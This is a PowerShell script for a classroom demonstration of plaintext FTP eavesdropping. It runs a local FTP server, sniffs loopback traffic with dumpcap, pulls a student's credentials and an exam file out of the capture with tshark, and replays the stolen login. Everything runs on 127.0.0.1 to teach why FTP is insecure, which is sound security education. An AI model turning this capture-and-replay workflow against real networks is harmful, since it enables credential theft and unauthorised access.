<#
=============================================================================
  attack.ps1  --  Windows-native plaintext FTP eavesdropping demonstration
-----------------------------------------------------------------------------
  Same scenario as the Linux version, using only native Windows pieces:

    server : Python + pyftpdlib        (ftp_server.py in this folder)
    client : ftp.exe                   (classic open/user/get/quit commands)
    sniffer: dumpcap on Npcap          (localhost capture on Windows)
    analyze: tshark + extract_secrets.py

  It starts the server, passively captures loopback, runs a normal student
  download, then reconstructs the credentials + the exam from the capture and
  replays the stolen login. Everything is on 127.0.0.1 against a server you
  control -- a teaching harness for *why FTP is insecure*.

  PREREQUISITES
    * Python with pyftpdlib
    * Wireshark with Npcap

  RUN  (in Windows Terminal / PowerShell):
    powershell -ExecutionPolicy Bypass -File .\attack.ps1

  Point it at an already-running server instead of starting one:
    .\attack.ps1 -StartServer:$false -Port 2121 -User student -Pass 'secret'

  To capture a JFTP client session instead of ftp.exe:
    .\attack.ps1 -Manual
    Connect JFTP to 127.0.0.1:2121, log in as student / RHITspr26!exam,
    download exam.txt, then press Enter in the console when done.
=============================================================================
#>
[CmdletBinding()]
param(
  [string]$FtpHost        = "127.0.0.1",
  [int]   $Port           = 2121,
  [string]$User           = "student",
  [string]$Pass           = "RHITspr26!exam",
  [int]   $CaptureSeconds = 10,
  [bool]  $StartServer    = $true,
  [switch]$Manual,                      # capture while YOU drive the client (e.g. Java JFTP)
  [int]   $ManualTimeout  = 180         # safety cap (s) on the manual-mode capture
)

$ErrorActionPreference = "Stop"
$Here = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $Here
$CapDir = Join-Path $Here "capture"
$Loot   = Join-Path $Here "loot"
$Root   = Join-Path $Here "server_root"
$Pcap   = Join-Path $CapDir "ftp_session.pcap"

function Hdr($t){ Write-Host "`n>>> $t" -ForegroundColor Cyan }
function Note($t){ Write-Host "    $t" -ForegroundColor DarkGray }

# ----------------------------------------------------- locate the tools ----
function Resolve-Tool($name, $fallbacks){
  $c = Get-Command $name -ErrorAction SilentlyContinue
  if($c){ return $c.Source }
  foreach($f in $fallbacks){ if(Test-Path $f){ return $f } }
  return $null
}
$ws      = "C:\Program Files\Wireshark"
$tshark  = Resolve-Tool "tshark"  @("$ws\tshark.exe")
$dumpcap = Resolve-Tool "dumpcap" @("$ws\dumpcap.exe")
$python  = Resolve-Tool "python"  @()
if(-not $python){ $python = Resolve-Tool "py" @() }
$ftpExe  = Resolve-Tool "ftp"     @("$env:WINDIR\System32\ftp.exe")

$fatal = @()
if(-not $tshark -or -not $dumpcap){ $fatal += "Wireshark (tshark/dumpcap) not found. Install Wireshark incl. Npcap." }
if(-not $python){ $fatal += "Python not found on PATH." }
if(-not $ftpExe){ $fatal += "ftp.exe not found (Windows FTP client)." }
if($fatal){ $fatal | ForEach-Object { Write-Host "ERROR: $_" -ForegroundColor Red }; exit 1 }

& $python -c "import pyftpdlib" 2>$null
if($LASTEXITCODE -ne 0){
  Write-Host "ERROR: pyftpdlib not importable. Run: pip install pyftpdlib" -ForegroundColor Red
  exit 1
}
# so extract_secrets.py (which shells out to tshark) can find it:
$env:PATH = (Split-Path $tshark) + ";" + $env:PATH

# --------------------------------------------- find the loopback adapter ----
$ifaceLines = & $dumpcap -D 2>$null
$loopLine = $ifaceLines | Where-Object { $_ -match 'loopback' } | Select-Object -First 1
if(-not $loopLine){
  Write-Host "ERROR: no Npcap loopback capture adapter found." -ForegroundColor Red
  Write-Host "       Re-run the Npcap installer and tick 'Support loopback traffic capture'." -ForegroundColor Red
  Write-Host "       (Interfaces dumpcap can see:)" -ForegroundColor DarkGray
  $ifaceLines | ForEach-Object { Write-Host "         $_" -ForegroundColor DarkGray }
  exit 1
}
$ifaceId = ($loopLine -split '\.')[0].Trim()

# ------------------------------------------------------------- bookkeeping --
Remove-Item -Recurse -Force $CapDir, $Loot -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $CapDir, $Loot | Out-Null
# make sure the server has a root with the exam (so ftp_server.py has content)
if(-not (Test-Path $Root)){ New-Item -ItemType Directory -Path $Root | Out-Null }
if(-not (Test-Path (Join-Path $Root "exam.txt"))){
  Set-Content -Path (Join-Path $Root "exam.txt") -Encoding ascii -Value "TOP SECRET EXAM`r`nAnswer to Q1: 42"
}
$serverProc = $null
$weStarted  = $false

Write-Host "FTP PLAINTEXT EAVESDROPPING DEMONSTRATION (Windows)" -ForegroundColor White
Note "target ftp://${FtpHost}:${Port}   loopback adapter #$ifaceId"

try {
  # ------------------------------------------------ 1. start the server -----
  Hdr "Phase 1  --  start the victim FTP server"
  if($StartServer){
    $env:FTP_DEMO_USER = $User     # the launcher reads these, so -User/-Pass are authoritative
    $env:FTP_DEMO_PASS = $Pass
    $serverProc = Start-Process -FilePath $python `
      -ArgumentList @("ftp_server.py", $FtpHost, "$Port", "server_root") `
      -WorkingDirectory $Here `
      -RedirectStandardOutput (Join-Path $CapDir "server.out.log") `
      -RedirectStandardError  (Join-Path $CapDir "server.err.log") `
      -PassThru -WindowStyle Hidden
    $weStarted = $true
    $up = $false
    for($i=0; $i -lt 50; $i++){
      try { $c = New-Object Net.Sockets.TcpClient; $c.Connect($FtpHost,$Port); $c.Close(); $up=$true; break }
      catch { Start-Sleep -Milliseconds 200 }
    }
    if(-not $up){ Write-Host "ERROR: server did not start; see $CapDir\server.err.log" -ForegroundColor Red; exit 1 }
    Write-Host "server up (pid $($serverProc.Id)), serving the exam over cleartext FTP" -ForegroundColor Green
  } else {
    Note "(-StartServer:`$false) assuming a server is already listening on ${FtpHost}:${Port}"
  }

  # --------------------------------------- 2. attacker starts sniffing ------
  Hdr "Phase 2  --  attacker starts a passive capture (dumpcap on loopback)"
  $capSecs = if($Manual){ $ManualTimeout } else { $CaptureSeconds }
  $capProc = Start-Process -FilePath $dumpcap `
    -ArgumentList @("-i","$ifaceId","-w","$Pcap","-a","duration:$capSecs","-f","tcp","-q") `
    -PassThru -WindowStyle Hidden
  Start-Sleep -Seconds 1
  if($capProc.HasExited){
    Write-Host "ERROR: dumpcap exited immediately -- likely a capture-permission issue." -ForegroundColor Red
    Write-Host "       Run this script from an elevated (Administrator) PowerShell." -ForegroundColor Red
    exit 1
  }
  Note "dumpcap running (pid $($capProc.Id)) -> $Pcap"
  Note "the attacker is only listening; it never talks to the server"

  # -------------------------------- 3. legitimate student downloads exam ----
  Hdr "Phase 3  --  a student logs in and downloads the exam (normal use)"
  if($Manual){
    Write-Host "  >>> Run the transfer in YOUR Java JFTP client now <<<" -ForegroundColor Yellow
    Note "In JFTP: connect to  ${FtpHost}:${Port}"
    Note "log in as  $User  /  $Pass   and download  exam.txt"
    Note "The capture is running the whole time -- no rush."
    Read-Host "  When the JFTP download has finished, press Enter here to analyze"
  } else {
    $cmds = @"
open $FtpHost $Port
user $User $Pass
binary
ls
get exam.txt capture\student_download.txt
quit
"@
    $cmdFile = Join-Path $CapDir "ftp_cmds.txt"
    Set-Content -Path $cmdFile -Value $cmds -Encoding Ascii
    Note "client transcript (ftp.exe):"
    & $ftpExe -n "-s:$cmdFile" 2>&1 | ForEach-Object { Write-Host "      $_" }
  }

  # --------------------------------------- 4. wait for capture to finish ----
  Hdr "Phase 4  --  stop the capture"
  if($Manual){
    Start-Sleep -Milliseconds 800      # let trailing ACKs flush to the pcap
    if(-not $capProc.HasExited){ Stop-Process -Id $capProc.Id -Force -ErrorAction SilentlyContinue }
  } else {
    Wait-Process -Id $capProc.Id -Timeout ($CaptureSeconds + 10) -ErrorAction SilentlyContinue
    if(-not $capProc.HasExited){ Stop-Process -Id $capProc.Id -Force -ErrorAction SilentlyContinue }
  }
  Start-Sleep -Milliseconds 300
  if(Test-Path $Pcap){ Note "capture saved: $Pcap ($((Get-Item $Pcap).Length) bytes)" }
  else { Write-Host "ERROR: no pcap produced." -ForegroundColor Red; exit 1 }

  # ------------------------------------- 5. attacker analyzes the capture ---
  Hdr "Phase 5  --  attacker reconstructs the session from the capture"
  & $python "extract_secrets.py" "$Pcap" "--port" "$Port" `
      "--original" "server_root\exam.txt" "--loot-dir" "loot"

  # ---------------------------------- 6. raw bytes as seen on the wire ------
  Hdr "Phase 6  --  the control channel exactly as it crossed the wire"
  Note "(tshark 'follow tcp stream' -- literally what the attacker saw)"
  $ctrl = & $tshark -r "$Pcap" -d "tcp.port==$Port,ftp" -Y 'ftp.request.command=="USER"' `
            -T fields -e tcp.stream 2>$null | Select-Object -First 1
  if(-not $ctrl){ $ctrl = 0 }
  & $tshark -r "$Pcap" -d "tcp.port==$Port,ftp" -q -z "follow,tcp,ascii,$ctrl" 2>$null |
      Select-Object -First 40 | ForEach-Object { Write-Host "      $_" }

  # ------------------------------ 7. replay the stolen credentials ----------
  Hdr "Phase 7  --  attacker replays the stolen credentials"
  $credFile = Join-Path $Loot "credentials.txt"
  $stUser = ((Get-Content $credFile | Where-Object {$_ -match '^username'}) -split "`t")[-1]
  $stPass = ((Get-Content $credFile | Where-Object {$_ -match '^password'}) -split "`t")[-1]
  Note "logging back in as '$stUser' using the sniffed password..."
  $replay = @"
open $FtpHost $Port
user $stUser $stPass
binary
get exam.txt loot\replayed_exam.txt
quit
"@
  $replayFile = Join-Path $CapDir "ftp_replay.txt"
  Set-Content -Path $replayFile -Value $replay -Encoding Ascii
  & $ftpExe -n "-s:$replayFile" 2>&1 |
      Where-Object { $_ -match '230|226|exam.txt|denied|530' } |
      ForEach-Object { Write-Host "      $_" }
  $orig = Join-Path $Root "exam.txt"
  $rep  = Join-Path $Loot "replayed_exam.txt"
  if((Test-Path $rep) -and -not (Compare-Object (Get-Content $orig) (Get-Content $rep))){
    Write-Host "   REPLAY SUCCESSFUL -- the stolen credentials are valid; the" -ForegroundColor Green
    Write-Host "   attacker independently re-downloaded the exam." -ForegroundColor Green
  } else {
    Write-Host "   replay did not reproduce the exam" -ForegroundColor Red
  }

  # ------------------------------------------------------------- summary ----
  Hdr "Summary"
  Write-Host "From a passive tap on the network, the attacker obtained:"
  Write-Host "  * the student's username and password     -> loot\credentials.txt"  -ForegroundColor Red
  Write-Host "  * a byte-identical copy of the exam        -> loot\stolen_exam.txt"  -ForegroundColor Red
  Write-Host "  * working access, via credential replay    -> loot\replayed_exam.txt" -ForegroundColor Red
  Note "artifacts left in: $CapDir  and  $Loot"
}
finally {
  if($weStarted -and $serverProc -and -not $serverProc.HasExited){
    Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue
  }
}
